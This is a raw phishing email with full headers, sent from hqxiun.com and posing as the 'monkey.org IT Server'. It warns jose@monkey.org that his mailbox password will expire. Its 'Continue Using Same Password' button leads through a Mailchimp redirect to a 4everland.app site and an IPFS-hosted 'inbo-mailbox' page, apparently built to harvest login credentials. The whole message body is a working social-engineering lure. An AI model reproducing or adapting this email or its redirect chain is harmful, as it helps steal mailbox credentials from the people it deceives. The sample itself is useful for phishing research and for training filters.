@@ -1,0 +1,151 @@
+Return-Path: ncho@hqxiun.com
+Delivered-To: jose@monkey.org
+X-FDA: 83179028478.38.B864F13
+Received: from srv81092.yourbestnetwork.net (hqxiun.com [8.39.147.67])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id CD019120003
+	for <jose@monkey.org>; Mon,  3 Mar 2025 04:56:49 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=hqxiun.com header.s=dkim header.b=GB7yYApo;
+	spf=pass (imf25.b.hostedemail.com: domain of ncho@hqxiun.com designates
+ 8.39.147.67 as permitted sender) smtp.mailfrom=ncho@hqxiun.com;
+	dmarc=pass (policy=reject) header.from=hqxiun.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1740977809;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=abRJlvBgYbOU67C9QEE3i2hQULyR3Ikw5vcoflx9CNA=;
+	b=meyCS6Ksx3azX3fFuXMmfwDXAlx/s5e+0XSf6ojmYtVoj+eIaZCP6LZ4/dWcPnMBPUELow
+	tDj5c7bdalbcpQnZCU4XexXQKntmjPTzhhvp/k9wpZ5WVdGBiNepyKxw3JwLFIn0h3yCLV
+	9ZhlIBPkWOHCIV90j1CHfRbO1aUBEMY=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=hqxiun.com header.s=dkim header.b=GB7yYApo;
+	spf=pass (imf25.b.hostedemail.com: domain of ncho@hqxiun.com designates
+ 8.39.147.67 as permitted sender) smtp.mailfrom=ncho@hqxiun.com;
+	dmarc=pass (policy=reject) header.from=hqxiun.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1740977809; a=rsa-sha256;
+	cv=none;
+	b=cUJBpWUMiyu4v8kqdjUZZTQJzxL/f8/ztKQ8xJgRfTDAl7zZEajKjl1eWRYe5KETjNmfLN
+	ZSYMVrNQucqCIojVRt7ZENfWFGYi+ry+luBse1M/evUswPD6cIXh27Fs1uoDelsFkAqyD8
+	31IAFUvDzFuA+TRlrm9v1WfvBEqpIdM=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=hqxiun.com;
+	s=dkim; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date
+	:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=abRJlvBgYbOU67C9QEE3i2hQULyR3Ikw5vcoflx9CNA=; b=GB7yYApoJMBG2sU56C+yHHxa0r
+	4cfXIKJju5oqSLPIf6S22S3KORhIKxc2eJl14vXO3u9m/yIQHJZ4y6jQtjbvwOBbhBH9qOP2UFTyl
+	6/SO3RVrJyfe0JTj8IS6CP8973JBk70FuOfnSg54ln4+s4AuklgWRaYtThRjMKiV0QCM=;
+Received: from [69.166.230.184]
+	by srv81092.yourbestnetwork.net with esmtpa (Exim 4.97.1)
+	(envelope-from <ncho@hqxiun.com>)
+	id 1toxrE-000000008Gu-3ize
+	for jose@monkey.org;
+	Mon, 03 Mar 2025 04:56:48 +0000
+From: monkey.org Server <ncho@hqxiun.com>
+To: jose@monkey.org
+Subject: jose@monkey.org Password Expire 3/2/2025 8:56:48 p.m.
+Date: 2 Mar 2025 20:56:48 -0800
+Message-ID: <20250302205648.7DF91F58B5F9A524@hqxiun.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-SPF-Fail: YES
+X-Stat-Signature: pe8obfyameu55hocbxmcygoxbdoasufu
+X-Rspamd-Queue-Id: CD019120003
+X-Rspam-User: 
+X-Rspamd-Server: rspam01
+X-Spam-Status: No, score=1.29
+X-HE-Tag: 1740977809-774764
+X-HE-Meta: 
+ U2FsdGVkX18BNxqWOp4LjoEuiPEwnQvp96xZmBjoKOKRFsWO7qMe+KoYiS+t+yxBG2RRn8qRirgZOLO4GHyzW2wC4LRRN27FbL2J+VCKPyGvLHiSmj040w+lm0TkM03PAb/z3esDdETXk9UPk2yv4oeaJvrqXdeREtwAGCXJNu8R8LgZx3Hsngm57+48B0qZXO/xF3i0QAreWB9ImEyQgP4B4hIbTHO0Et4KWAwFJBZcWAmDE3LKH449mMF/xDo6hVCiLfONILV8wv91kMfZB10iT7EPxEiKwtaSrqnxFWbicoi1h0TkDNiYUsn/SM8JmaxXNoHRTpeag84UGZCOAVX0seEP3MDb/EMghFEjw9gtIqUrDP4nrkl63eFfvp2ioYHYXfAFWdJrTgRxUUGshcfKm1JMv/J+8nhArwvF7GN4oTU6panCfk9MJxJoipzlVez6pvWmUYDI60TxC97ygi43LY4U12hUvsBsBapGhbjbSAzwXDSfccvOJJQfZodKFt9oCC6hfCiPKFMytEy+yuY2jnFQrngImqbY/VR69FdFQh468WeR2kJl95+UdsLpgLxrcdurlptOcJd2EVfyUBP3oT7YI6Uq03fop7e262BhY33JvtsGGmKp94ILNw+hOTLFNBXthPg0hCOZGSuF7Fv3171DUCqDv8grcvbK3k+L37y4zAb8ea777s7gPEwGMFPWGmNlHvm4KVHPy5q5WcK+CDLuCTKcysdzBb+uhBsCWZuyyOb+9OgDBzSXh1KyTRJ8lD6xY2qty1UslfL7zNZDUTbuIwIGgLPX/acGDdYS8PiffJgjobqL0xxkJK/A3TnOuLwH0bG8bLy/i+drLD9gzViJXnK+IEgVxNf1qkD+Wnc/bsedtCLHOoVWhL7KgIBZa6oRINGIOea1p7P0npwT4LIKWNl3aLHx5V6oIe0US9NVpMN9tut4IJiSTGxMemzaX8FnM3f9xGHMIvV+AilzEJh
+ 1bPIScU1WP3r177YVotbZtxG9xYPcfgkCRCTTbHWTEcpHI0wG+sE223XMaVnq6FHARD22Mpvazdhg3XDQ0jPnLwAL4faPLxIBymrKQFP3EswbWb2eO1G4MyQtjFT3/V2r0/PAhk7C/0yF8xB4lr5gBx2C88A1CGZGEL1S4j/KlPF9vVoYQU8/la2LU1KHhocnHIfhk0zPwxsuoRnvo09xANJnTcr3Vr93rlWJ9Tw1J/DOxwLAR/pPprhV5MWEflr6FKMxQr8U/N7KLi5Jo4JtX1ym+HMtTopzIE83YW48d2FpENA6whOcuWjqO2B3nOLCuLLUL0NMW6eM/llPkVstvYGYpvuEsfv0iZeL87AGqPzuU3QmcJid9RWorPrSwT+T31P446KmcdZ6t26mrLgH92CrfLwmbp0eMUQiWk+mNo34WBSRpvRaaFMtLTkzGfhqAtBylMJ5sAXKE2bi05DR1JEcAxAnGKE24WTeQwBkVHo6CUe+alm5HrvO0xSaIx1M+0yl6JMH3CHZwg0gJIiQd//5dTsF5LvthBd3JMA+RSY5bLPZaX7JOLUMCWdjFblIaZTY17rJSMPr7KQhs4Fmy/iuMKomF9Qq0ZoqfLk/oMY1gCQ3dGqrS1+HDdnMfx+U0ghMQGSuotUGKmDPwspVU0EgJjQjTcskE6GAYUjI/DOAVuLGgPLXh4m+MyxFgIvFhuDCwRPUQrnu5bW4VMT4CMbA+S+XmLjn17glVJ8tCG8fflUYvUnkE0NF8w==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 74
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div tabindex=3D"1" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" i=
+d=3D":1b1" role=3D"textbox" aria-expanded=3D"false" aria-controls=3D":1de" =
+aria-owns=3D":1de" style=3D"direction: ltr; min-height: 376px;" contentedit=
+able=3D"true" hidefocus=3D"true" spellcheck=3D"false" aria-label=3D"Message=
+ Body" aria-multiline=3D"true" g_editable=3D"true" writingsuggestions=3D"fa=
+lse"><div dir=3D"ltr">
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial,Helvetica,sans-serif,serif,Em=
+ojiFont; font-size: small; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial;">
+<div style=3D'border-width: 0px; margin: 0px 0px 0px 18px; padding: 5px 5px=
+ 5px 0px; width: 477px; color: rgb(32, 31, 30); font-family: wf_segoe-ui_se=
+mibold,"Segoe UI Semibold","Segoe WP Semibold","Segoe UI","Segoe WP",Tahoma=
+,Arial,sans-serif,serif,EmojiFont; font-size: 15px; vertical-align: baselin=
+e; float: left;'>
+<div style=3D'border-width: 0px; margin: 0px; padding: 5px 0px 5px 3px; fon=
+t-family: wf_segoe-ui_normal,"Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,=
+serif,EmojiFont; font-size: 13px; vertical-align: baseline; background-colo=
+r: rgb(244, 248, 245);'><span style=3D"border-width: 0px; margin: 0px; padd=
+ing: 0px; font-family: inherit; vertical-align: baseline;"><div><br><br><br=
+></div>Message from<span> </span><span style=3D"color: rgb(0, 0, 255);">mon=
+key.org</span><span> </span>IT Server.</span></div>
+</div><div style=3D'border-width: 0px; margin: 0px; padding: 0px; color: rg=
+b(32, 31, 30); font-family: wf_segoe-ui_semibold,"Segoe UI Semibold","Segoe=
+ WP Semibold","Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont=
+; font-size: 15px; vertical-align: baseline;'><div style=3D"border-width: 0=
+px; margin: 0px; padding: 2px; width: 5px; height: 30px; font-family: inher=
+it; vertical-align: baseline; background-color: rgb(86, 166, 89);">
+<br style=3D'color: rgb(32, 31, 30); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: wf_segoe-ui_semibold,"Segoe UI Semib=
+old","Segoe WP Semibold","Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,seri=
+f,EmojiFont; font-size: 15px; font-style: normal; font-weight: 400; word-sp=
+acing: 0px; white-space: normal; font-variant-ligatures: normal; font-varia=
+nt-caps: normal; text-decoration-style: initial; text-decoration-color: ini=
+tial;'><br></div></div><p><br><br></p><p>
+<font style=3D'font-family: "times new roman",serif,serif,EmojiFont;'><br><=
+br>Dear<span> </span><span style=3D"color: rgb(0, 0, 255);">jose@monkey.org=
+</span></font></p><p><font style=3D'font-family: "times new roman",serif,se=
+rif,EmojiFont;'>Please note your&nbsp;mailbox password will expire on 3/2/2=
+025 8:56:48 p.m.</font></p><p><font style=3D'font-family: "times new roman"=
+,serif,serif,EmojiFont;'>Kindly proceed using the same password or allow ma=
+ilbox to provide password.</font></p><p></p><table><tbody><tr>
+<td style=3D"margin: 0px; padding: 5px 7px; border-radius: 3px; color: whit=
+e; background-color: cornflowerblue;">
+<a style=3D"color: white; text-decoration-line: none;" href=3D"https://us15=
+=2Emailchimp.com/mctx/clicks?url=3Dhttps%3A%2F%2Ffriday-2-3zo8.4everland.ap=
+p%2F&amp;xid=3D7a53e4b921&amp;uid=3D224578370&amp;iid=3Dcf504ac8e9&amp;pool=
+=3Dcts&amp;v=3D2&amp;c=3D1740958056&amp;h=3D2e9af5f3f6e8e85b8afd324e7eeee37=
+91f4298b423b22f889547393e1ef7cd51#jose@monkey.org" target=3D"_blank" rel=3D=
+"noopener noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/bafybeigsrptje7aawbztkrfzueplsu2zevdsyifgt2jsnrkaueh5trygxm/in=
+bo-mailbox.html%23cfo@waterworldshipping.com&amp;source=3Dgmail&amp;ust=3D1=
+740793599123000&amp;usg=3DAOvVaw0ZWxQaR5Oc0GL3zPbFX_Cf"><font style=3D'font=
+-family: "times new roman",serif,serif,EmojiFont;'>Continue Using Same Pass=
+word</font></a></td></tr></tbody></table><p></p><font style=3D'font-family:=
+ "times new roman",serif,serif,EmojiFont;'>Regards,</font></div>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial,Helvetica,sans-serif,serif,Em=
+ojiFont; font-size: small; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial;"><font style=3D'font-family: "time=
+s new roman",serif,serif,EmojiFont;'>
+WebMail Admin Team.</font></div><div style=3D"color: rgb(34, 34, 34); text-=
+transform: none; text-indent: 0px; letter-spacing: normal; font-family: Ari=
+al,Helvetica,sans-serif,serif,EmojiFont; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; background-co=
+lor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps:=
+ normal; text-decoration-style: initial; text-decoration-color: initial;">
+<font style=3D'color: rgb(0, 0, 255); font-family: "times new roman",serif,=
+serif,EmojiFont;'>monkey.org</font></div><br></div>
+</div>
+</body></html>
+
